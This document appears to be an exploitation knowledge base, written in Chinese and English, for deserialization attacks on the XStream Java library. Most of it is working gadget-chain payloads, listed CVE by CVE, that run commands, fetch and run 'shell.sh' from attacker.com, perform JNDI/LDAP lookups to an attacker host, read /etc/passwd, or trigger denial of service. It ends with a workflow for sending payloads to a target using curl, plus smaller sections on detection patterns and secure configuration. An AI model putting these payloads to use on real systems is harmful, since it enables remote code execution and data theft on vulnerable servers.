# XStream Exploitation Payloads Reference

> Phase 4 Validation Knowledge Base — XStream Deserialization

---

## 1. Overview & Version Timeline

| Version | Security Status | Key Changes |
|---------|----------------|-------------|
| < 1.4.7 | 无任何保护 | 任意类实例化 |
| 1.4.7 | 引入安全框架 | 但默认未启用 |
| 1.4.10 | 部分默认保护 | 黑名单机制 |
| 1.4.13 | 黑名单增强 | 修复部分 CVE |
| 1.4.14 | 进一步加固 | 新增类型限制 |
| 1.4.15 | 修复更多绕过 | CVE-2020 系列修复 |
| 1.4.16 | 再次加固 | CVE-2021-21341/21342 |
| 1.4.17 | 大规模修复 | CVE-2021-21343 至 21351 |
| 1.4.18 | 默认白名单 | 安全框架默认启用 |
| 1.4.19+ | 全面白名单 | CVE-2022 修复 |

---

## 2. Pre-1.4.7 — 无保护直接利用

### 2.1 DynamicProxyConverter — 任意方法调用

```xml
<dynamic-proxy>
  <interface>java.lang.Comparable</interface>
  <handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
      <command>
        <string>id</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</dynamic-proxy>
```

### 2.2 ProcessBuilder 直接调用

```xml
<java.lang.ProcessBuilder>
  <command>
    <string>bash</string>
    <string>-c</string>
    <string>id</string>
  </command>
  <redirectErrorStream>false</redirectErrorStream>
</java.lang.ProcessBuilder>
```

### 2.3 Runtime.exec via Groovy

```xml
<groovy.util.Expando>
  <expandoProperties>
    <entry>
      <string>hashCode</string>
      <org.codehaus.groovy.runtime.MethodClosure>
        <delegate class="groovy.util.Expando"/>
        <owner class="java.lang.ProcessBuilder">
          <command>
            <string>id</string>
          </command>
        </owner>
        <method>start</method>
      </org.codehaus.groovy.runtime.MethodClosure>
    </entry>
  </expandoProperties>
</groovy.util.Expando>
```

---

## 3. CVE-2013-7285 — EventHandler RCE

- **影响版本**: XStream ≤ 1.4.6 (或 1.4.10 之前未配置安全框架)
- **CVSS**: 9.8
- **类型**: Remote Code Execution

```xml
<sorted-set>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>bash</string>
          <string>-c</string>
          <string>curl attacker.com/shell.sh|bash</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```

**触发机制**: `sorted-set` 要求元素实现 `Comparable`，代理的 `compareTo()` 调用触发 `EventHandler` → `ProcessBuilder.start()`

---

## 4. CVE-2020-26217 — ImageIO RCE

- **影响版本**: XStream < 1.4.14
- **CVSS**: 8.0
- **类型**: Remote Code Execution

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <contentType>text/plain</contentType>
            <is class="java.io.SequenceInputStream">
              <e class="javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator">
                <iterator class="javax.imageio.spi.FilterIterator">
                  <iter class="java.util.ArrayList$Itr">
                    <cursor>0</cursor>
                    <lastRet>-1</lastRet>
                    <expectedModCount>1</expectedModCount>
                    <outer-class>
                      <java.lang.ProcessBuilder>
                        <command>
                          <string>id</string>
                        </command>
                      </java.lang.ProcessBuilder>
                    </outer-class>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>start</name>
                  </filter>
                  <next/>
                </iterator>
                <type>KEYS</type>
              </e>
              <in class="java.io.ByteArrayInputStream">
                <buf></buf>
                <pos>0</pos>
                <mark>0</mark>
                <count>0</count>
              </in>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

---

## 5. CVE-2021-21344 — ClassLoader RCE

- **影响版本**: XStream < 1.4.16
- **CVSS**: 9.8
- **类型**: Remote Code Execution via remote class loading

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='sun.tracing.NullProvider'>
        <active>true</active>
        <providerType>java.lang.Comparable</providerType>
        <probes>
          <entry>
            <method>
              <class>java.lang.Comparable</class>
              <name>compareTo</name>
              <parameter-types>
                <class>java.lang.Object</class>
              </parameter-types>
            </method>
            <sun.tracing.dtrace.DTraceProbe>
              <proxy class='dynamic-proxy' reference='../../..'/>
              <implementing__method>
                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>
                <name>newTransformer</name>
                <parameter-types/>
              </implementing__method>
            </sun.tracing.dtrace.DTraceProbe>
          </entry>
        </probes>
      </handler>
    </dynamic-proxy>
    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization='custom'>
      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
        <default>
          <__name>Pwnr</__name>
          <__bytecodes>
            <byte-array>BASE64_ENCODED_EVIL_CLASS</byte-array>
          </__bytecodes>
          <__transletIndex>-1</__transletIndex>
          <__indentNumber>0</__indentNumber>
        </default>
        <boolean>false</boolean>
      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

---

## 6. CVE-2021-21345 — SSRF / RCE

- **影响版本**: XStream < 1.4.16
- **CVSS**: 9.9
- **类型**: Server-Side Request Forgery leading to RCE

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <javax.naming.ldap.Rdn_-RdnEntry>
      <type>ysomap</type>
      <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
        <m__DTMXRTreeFrag>
          <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
            <m__expandedNames/>
            <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
              <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
                <javax.sql.rowset.BaseRowSet>
                  <default>
                    <dataSource>ldap://attacker.com:1389/Exploit</dataSource>
                  </default>
                </javax.sql.rowset.BaseRowSet>
              </fPullParserConfig>
              <fConfigSetInput>
                <class>com.sun.rowset.JdbcRowSetImpl</class>
                <name>connect</name>
                <parameter-types/>
              </fConfigSetInput>
            </m__incrementalSAXSource>
          </m__dtm>
        </m__DTMXRTreeFrag>
      </value>
    </javax.naming.ldap.Rdn_-RdnEntry>
    <javax.naming.ldap.Rdn_-RdnEntry>
      <type>ysomap</type>
      <value class='com.sun.org.apache.xpath.internal.objects.XString'>
        <m__obj class='string'>test</m__obj>
      </value>
    </javax.naming.ldap.Rdn_-RdnEntry>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

---

## 7. CVE-2021-21346 — SwingLazyValue RCE

- **影响版本**: XStream < 1.4.16
- **CVSS**: 9.8

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='sun.tracing.NullProvider'>
        <active>true</active>
        <providerType>java.lang.Comparable</providerType>
        <probes>
          <entry>
            <method>
              <class>java.lang.Comparable</class>
              <name>compareTo</name>
              <parameter-types>
                <class>java.lang.Object</class>
              </parameter-types>
            </method>
            <sun.tracing.dtrace.DTraceProbe>
              <proxy class='dynamic-proxy' reference='../../..'/>
              <implementing__method>
                <class>sun.swing.SwingLazyValue</class>
                <name>createValue</name>
                <parameter-types>
                  <class>javax.swing.UIDefaults</class>
                </parameter-types>
              </implementing__method>
            </sun.tracing.dtrace.DTraceProbe>
          </entry>
        </probes>
      </handler>
    </dynamic-proxy>
    <sun.swing.SwingLazyValue>
      <className>javax.naming.InitialContext</className>
      <methodName>doLookup</methodName>
      <args>
        <string>ldap://attacker.com:1389/Exploit</string>
      </args>
    </sun.swing.SwingLazyValue>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

---

## 8. CVE-2021-21347 — ServiceLoader RCE

- **影响版本**: XStream < 1.4.16
- **CVSS**: 9.8

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='sun.tracing.NullProvider'>
        <active>true</active>
        <providerType>java.lang.Comparable</providerType>
        <probes>
          <entry>
            <method>
              <class>java.lang.Comparable</class>
              <name>compareTo</name>
              <parameter-types>
                <class>java.lang.Object</class>
              </parameter-types>
            </method>
            <sun.tracing.dtrace.DTraceProbe>
              <proxy class='dynamic-proxy' reference='../../..'/>
              <implementing__method>
                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</class>
                <name>&lt;init&gt;</name>
                <parameter-types>
                  <class>javax.xml.transform.Templates</class>
                </parameter-types>
              </implementing__method>
            </sun.tracing.dtrace.DTraceProbe>
          </entry>
        </probes>
      </handler>
    </dynamic-proxy>
    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization='custom'>
      <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
        <default>
          <__name>Pwnr</__name>
          <__bytecodes>
            <byte-array>BASE64_EVIL_CLASS</byte-array>
          </__bytecodes>
          <__transletIndex>-1</__transletIndex>
        </default>
        <boolean>false</boolean>
      </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

---

## 9. CVE-2021-21349 — SSRF via HttpURLConnection

- **影响版本**: XStream < 1.4.16
- **CVSS**: 8.6
- **类型**: Server-Side Request Forgery

```xml
<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
        <dataHandler>
          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
            <contentType>text/plain</contentType>
            <is class='java.io.SequenceInputStream'>
              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
                <iterator class='com.sun.tools.javac.processing.JavacFiler$1'>
                  <val$googlers class='com.sun.tools.javac.util.SharedNameTable$NameImpl'>
                    <table class='com.sun.tools.javac.util.SharedNameTable'>
                      <hashes/>
                      <bytes/>
                    </table>
                    <index>0</index>
                    <length>0</length>
                    <next>
                      <table reference='../../table'/>
                      <index>0</index>
                      <length>0</length>
                    </next>
                  </val$googlers>
                  <val$itr class='java.net.URL$3$1$URLEnumeration'>
                    <val$urls class='java.util.ArrayList'>
                      <java.net.URL>
                        <protocol>http</protocol>
                        <host>attacker.com</host>
                        <port>80</port>
                        <file>/ssrf</file>
                      </java.net.URL>
                    </val$urls>
                  </val$itr>
                </iterator>
                <type>KEYS</type>
              </e>
              <in class='java.io.ByteArrayInputStream'>
                <buf></buf>
                <pos>0</pos>
                <mark>0</mark>
                <count>0</count>
              </in>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <string>test</string>
  </entry>
</map>
```

---

## 10. CVE-2021-21350 — ClassLoader Arbitrary Code Execution

- **影响版本**: XStream < 1.4.16
- **CVSS**: 9.8

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='sun.tracing.NullProvider'>
        <active>true</active>
        <providerType>java.lang.Comparable</providerType>
        <probes>
          <entry>
            <method>
              <class>java.lang.Comparable</class>
              <name>compareTo</name>
              <parameter-types>
                <class>java.lang.Object</class>
              </parameter-types>
            </method>
            <sun.tracing.dtrace.DTraceProbe>
              <proxy class='dynamic-proxy' reference='../../..'/>
              <implementing__method>
                <class>com.sun.org.apache.bcel.internal.util.JavaWrapper</class>
                <name>_main</name>
                <parameter-types>
                  <class>[Ljava.lang.String;</class>
                </parameter-types>
              </implementing__method>
            </sun.tracing.dtrace.DTraceProbe>
          </entry>
        </probes>
      </handler>
    </dynamic-proxy>
    <string-array>
      <string>$$BCEL$$_ENCODED_EVIL_CLASS</string>
    </string-array>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

---

## 11. CVE-2021-21351 — JNDI via ReflectionProvider

- **影响版本**: XStream < 1.4.16
- **CVSS**: 9.1

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='sun.tracing.NullProvider'>
        <active>true</active>
        <providerType>java.lang.Comparable</providerType>
        <probes>
          <entry>
            <method>
              <class>java.lang.Comparable</class>
              <name>compareTo</name>
              <parameter-types>
                <class>java.lang.Object</class>
              </parameter-types>
            </method>
            <sun.tracing.dtrace.DTraceProbe>
              <proxy class='dynamic-proxy' reference='../../..'/>
              <implementing__method>
                <class>javax.naming.InitialContext</class>
                <name>lookup</name>
                <parameter-types>
                  <class>java.lang.String</class>
                </parameter-types>
              </implementing__method>
            </sun.tracing.dtrace.DTraceProbe>
          </entry>
        </probes>
      </handler>
    </dynamic-proxy>
    <string>ldap://attacker.com:1389/Exploit</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

---

## 12. CVE-2021-39139 — Arbitrary Code Execution

- **影响版本**: XStream < 1.4.18
- **CVSS**: 8.5

```xml
<linked-hash-set>
  <jdk.nashorn.internal.objects.NativeString>
    <flags>0</flags>
    <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='com.sun.xml.internal.ws.util.ReadAllStream$FileStream'>
            <tempFile>/etc/passwd</tempFile>
          </is>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </value>
  </jdk.nashorn.internal.objects.NativeString>
</linked-hash-set>
```

---

## 13. CVE-2021-39144 — Runtime.exec via Sun TransformerFactory

- **影响版本**: XStream < 1.4.18
- **CVSS**: 8.5

```xml
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
    </default>
    <int>3</int>
    <dynamic-proxy>
      <interface>java.lang.Comparable</interface>
      <handler class='sun.tracing.NullProvider'>
        <active>true</active>
        <providerType>java.lang.Comparable</providerType>
        <probes>
          <entry>
            <method>
              <class>java.lang.Comparable</class>
              <name>compareTo</name>
              <parameter-types>
                <class>java.lang.Object</class>
              </parameter-types>
            </method>
            <sun.tracing.dtrace.DTraceProbe>
              <proxy class='dynamic-proxy' reference='../../..'/>
              <implementing__method>
                <class>com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl</class>
                <name>newTransformer</name>
                <parameter-types>
                  <class>javax.xml.transform.Source</class>
                </parameter-types>
              </implementing__method>
            </sun.tracing.dtrace.DTraceProbe>
          </entry>
        </probes>
      </handler>
    </dynamic-proxy>
    <javax.xml.transform.stream.StreamSource>
      <inputStream class='java.io.FileInputStream'>
        <fd>
          <fd>0</fd>
        </fd>
      </inputStream>
      <systemId>http://attacker.com/evil.xslt</systemId>
    </javax.xml.transform.stream.StreamSource>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

---

## 14. CVE-2021-39149 — HashMap + ServiceLoader

- **影响版本**: XStream < 1.4.18
- **CVSS**: 8.5

```xml
<linked-hash-set>
  <dynamic-proxy>
    <interface>map-entry</interface>
    <handler class='java.beans.EventHandler'>
      <target class='java.lang.Runtime'>
        <method>
          <class>java.lang.Runtime</class>
          <name>getRuntime</name>
          <parameter-types/>
        </method>
      </target>
      <action>exec</action>
      <eventPropertyName>key</eventPropertyName>
    </handler>
  </dynamic-proxy>
  <dynamic-proxy>
    <interface>map-entry</interface>
    <handler class='java.beans.EventHandler'>
      <target class='java.lang.String'>id</target>
      <action>toString</action>
    </handler>
  </dynamic-proxy>
</linked-hash-set>
```

---

## 15. CVE-2021-39153 — javax.script.ScriptEngine

- **影响版本**: XStream < 1.4.18
- **CVSS**: 8.5

```xml
<map>
  <entry>
    <string>foo</string>
    <dynamic-proxy>
      <interface>java.lang.AutoCloseable</interface>
      <handler class='java.beans.EventHandler'>
        <target class='javax.script.ScriptEngineManager'>
          <factories/>
          <globalScope/>
          <lookupMechanism>0</lookupMechanism>
        </target>
        <action>getEngineByName</action>
        <eventPropertyName>foo</eventPropertyName>
      </handler>
    </dynamic-proxy>
  </entry>
</map>
```

---

## 16. CVE-2022-41966 — Stack Overflow DoS

- **影响版本**: XStream < 1.4.20
- **CVSS**: 7.5
- **类型**: Denial of Service

```xml
<!-- 通过深度嵌套触发 StackOverflowError -->
<map>
  <entry>
    <string>a</string>
    <map>
      <entry>
        <string>b</string>
        <map>
          <entry>
            <string>c</string>
            <!-- 重复嵌套数千层 -->
            <map>
              <!-- ... 继续嵌套直到触发 StackOverflow ... -->
            </map>
          </entry>
        </map>
      </entry>
    </map>
  </entry>
</map>
```

**简化触发 (递归引用)**:

```xml
<map>
  <entry>
    <string>foor</string>
    <string>bar</string>
  </entry>
  <entry>
    <string>foo2</string>
    <map reference='../..'/>
  </entry>
</map>
```

---

## 17. Converter-based Exploits

### ReflectionConverter (默认)

大部分 gadget 依赖 `ReflectionConverter` 来重建对象字段。

### DynamicProxyConverter

```xml
<dynamic-proxy>
  <interface>java.lang.Comparable</interface>
  <handler class="java.beans.EventHandler">
    <!-- ... -->
  </handler>
</dynamic-proxy>
```

### JavaBeanConverter

```xml
<object class="java.lang.ProcessBuilder">
  <void property="command">
    <array class="java.lang.String" length="3">
      <void index="0"><string>bash</string></void>
      <void index="1"><string>-c</string></void>
      <void index="2"><string>id</string></void>
    </array>
  </void>
  <void method="start"/>
</object>
```

---

## 18. Detection Patterns in Source Code

### XStream Usage

```java
// 高危: 无安全配置直接解析外部输入
XStream xstream = new XStream();
Object obj = xstream.fromXML(userInput);

// 高危: 使用 DomDriver/StaxDriver 但无安全配置
XStream xstream = new XStream(new DomDriver());
xstream.fromXML(request.getInputStream());

// 中危: 有黑名单但可能不完整
XStream xstream = new XStream();
xstream.denyTypes(new String[]{"java.beans.EventHandler"});
xstream.fromXML(input);

// 中危: allowTypes 过于宽泛
XStream xstream = new XStream();
xstream.allowTypes(new Class[]{Object.class});
```

### 安全配置 (正确做法)

```java
// 安全: 白名单模式 (1.4.7+)
XStream xstream = new XStream();
xstream.addPermission(NoTypePermission.NONE);
xstream.addPermission(NullPermission.NULL);
xstream.addPermission(PrimitiveTypePermission.PRIMITIVES);
xstream.allowTypes(new Class[]{MyDTO.class, MyVO.class});

// 安全: 使用 setupDefaultSecurity (1.4.10+)
XStream xstream = new XStream();
XStream.setupDefaultSecurity(xstream);
xstream.allowTypes(new Class[]{MyDTO.class});

// 最安全: 1.4.18+ 默认白名单
XStream xstream = new XStream();
// 默认就是安全的，需要显式 allow 才能反序列化自定义类
```

### Maven 依赖检查

```xml
<!-- 高危 -->
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.10</version>  <!-- 存在多个 CVE -->
</dependency>

<!-- 安全 -->
<dependency>
    <groupId>com.thoughtworks.xstream</groupId>
    <artifactId>xstream</artifactId>
    <version>1.4.20</version>  <!-- 最新安全版本 -->
</dependency>
```

---

## 19. Exploitation Workflow

### Step 1: 确认 XStream 版本

```bash
# 通过错误信息
# 发送无效 XML，观察错误栈中的版本信息

# 通过 pom.xml / gradle 依赖
grep -r "xstream" pom.xml build.gradle
```

### Step 2: 确认安全配置

```java
// 检查是否存在:
// 1. setupDefaultSecurity()
// 2. addPermission(NoTypePermission.NONE)
// 3. allowTypes() 白名单
// 4. denyTypes() 黑名单

// 无任何安全配置 = 可利用
```

### Step 3: 选择 Payload

```
版本 < 1.4.7  → CVE-2013-7285 (EventHandler)
版本 < 1.4.14 → CVE-2020-26217 (ImageIO chain)
版本 < 1.4.16 → CVE-2021-21344/21345/21346/21347/21350/21351
版本 < 1.4.18 → CVE-2021-39139/39144/39149/39153
版本 < 1.4.20 → CVE-2022-41966 (DoS)
有黑名单无白名单 → 尝试绕过黑名单
```

### Step 4: 发送 Payload

```bash
# HTTP 请求 (Content-Type: application/xml 或 text/xml)
curl -X POST http://target/api/import \
  -H "Content-Type: application/xml" \
  -d @payload.xml

# SOAP 请求中嵌入
curl -X POST http://target/ws \
  -H "Content-Type: text/xml" \
  -d '<soap:Envelope>...<payload>XSTREAM_XML</payload>...</soap:Envelope>'
```

---

## 20. Common Contexts Where XStream is Used

- **Spring MVC** — XML 请求体反序列化
- **Apache Struts** — 配置文件处理
- **Jenkins** — 配置和 API XML
- **Bamboo** — 构建配置
- **Confluence** — 数据导入
- **自定义 REST API** — XML 格式数据交换
- **配置管理** — 序列化配置到文件

---

## 21. Mitigation Verification Checklist

| Check | Secure | Insecure |
|-------|--------|----------|
| XStream version | ≥ 1.4.20 | < 1.4.18 |
| Security framework | 白名单模式 | 无配置 / 仅黑名单 |
| `setupDefaultSecurity()` | 有 (1.4.10-1.4.17) | 无 |
| `NoTypePermission.NONE` | 有 | 无 |
| `allowTypes()` | 仅允许 DTO 类 | 允许 Object/宽泛包 |
| DynamicProxy | 已禁用 | 默认允许 |
| Input validation | XML schema 校验 | 直接解析 |

### 验证安全配置的测试 Payload

```xml
<!-- 测试是否能实例化任意类 (无害) -->
<java.util.ArrayList>
  <string>test</string>
</java.util.ArrayList>

<!-- 如果以下报错 "Security" 则说明有保护 -->
<dynamic-proxy>
  <interface>java.lang.Runnable</interface>
  <handler class="java.beans.EventHandler">
    <target class="java.lang.System"/>
    <action>currentTimeMillis</action>
  </handler>
</dynamic-proxy>
```

---

## 22. Alternative Payload Formats

### JSON (XStream supports JSON mode)

```java
// 如果使用 JettisonMappedXmlDriver
XStream xstream = new XStream(new JettisonMappedXmlDriver());
```

```json
{
  "dynamic-proxy": {
    "interface": "java.lang.Comparable",
    "handler": {
      "@class": "java.beans.EventHandler",
      "target": {
        "@class": "java.lang.ProcessBuilder",
        "command": ["id"]
      },
      "action": "start"
    }
  }
}
```

### Hierarchical Stream (特殊编码)

XStream 支持多种 HierarchicalStreamDriver:
- `DomDriver` — 标准 XML DOM
- `StaxDriver` — StAX 解析
- `XppDriver` — XPP3 (默认)
- `JettisonMappedXmlDriver` — JSON
- `BinaryStreamDriver` — 二进制格式

每种 driver 可能有不同的解析行为，payload 需适配。

---

## 23. Chained Exploits

### XStream + JNDI

```xml
<!-- XStream 触发 JNDI lookup -->
<javax.naming.InitialContext>
  <init>
    <hashtable>
      <entry>
        <string>java.naming.factory.initial</string>
        <string>com.sun.jndi.rmi.registry.RegistryContextFactory</string>
      </entry>
      <entry>
        <string>java.naming.provider.url</string>
        <string>rmi://attacker.com:1099</string>
      </entry>
    </hashtable>
  </init>
</javax.naming.InitialContext>
```

### XStream + TemplatesImpl (本地利用，不出网)

```xml
<com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization='custom'>
  <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
    <default>
      <__name>EvilTemplate</__name>
      <__bytecodes>
        <byte-array>yv66vg...BASE64_ENCODED_BYTECODE...</byte-array>
      </__bytecodes>
      <__transletIndex>-1</__transletIndex>
      <__indentNumber>0</__indentNumber>
    </default>
    <boolean>false</boolean>
  </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
</com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
```

---

## 24. Version-CVE Quick Lookup

| CVE | Type | Affected | Fix Version |
|-----|------|----------|-------------|
| CVE-2013-7285 | RCE | < 1.4.7 | 1.4.7 |
| CVE-2016-3674 | XXE | < 1.4.9 | 1.4.9 |
| CVE-2017-7957 | DoS | < 1.4.10 | 1.4.10 |
| CVE-2019-10173 | RCE | < 1.4.12 | 1.4.12 |
| CVE-2020-26217 | RCE | < 1.4.14 | 1.4.14 |
| CVE-2020-26258 | SSRF | < 1.4.15 | 1.4.15 |
| CVE-2020-26259 | File Delete | < 1.4.15 | 1.4.15 |
| CVE-2021-21341 | DoS | < 1.4.16 | 1.4.16 |
| CVE-2021-21342 | SSRF | < 1.4.16 | 1.4.16 |
| CVE-2021-21343 | File Delete | < 1.4.16 | 1.4.16 |
| CVE-2021-21344 | RCE | < 1.4.16 | 1.4.16 |
| CVE-2021-21345 | RCE | < 1.4.16 | 1.4.16 |
| CVE-2021-21346 | RCE | < 1.4.16 | 1.4.16 |
| CVE-2021-21347 | RCE | < 1.4.16 | 1.4.16 |
| CVE-2021-21348 | DoS | < 1.4.16 | 1.4.16 |
| CVE-2021-21349 | SSRF | < 1.4.16 | 1.4.16 |
| CVE-2021-21350 | RCE | < 1.4.16 | 1.4.16 |
| CVE-2021-21351 | RCE | < 1.4.16 | 1.4.16 |
| CVE-2021-39139 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39140 | DoS | < 1.4.18 | 1.4.18 |
| CVE-2021-39141 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39144 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39145 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39146 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39147 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39148 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39149 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39150 | SSRF | < 1.4.18 | 1.4.18 |
| CVE-2021-39151 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39152 | SSRF | < 1.4.18 | 1.4.18 |
| CVE-2021-39153 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2021-39154 | RCE | < 1.4.18 | 1.4.18 |
| CVE-2022-40151 | DoS | < 1.4.19 | 1.4.19 |
| CVE-2022-41966 | DoS | < 1.4.20 | 1.4.20 |

---
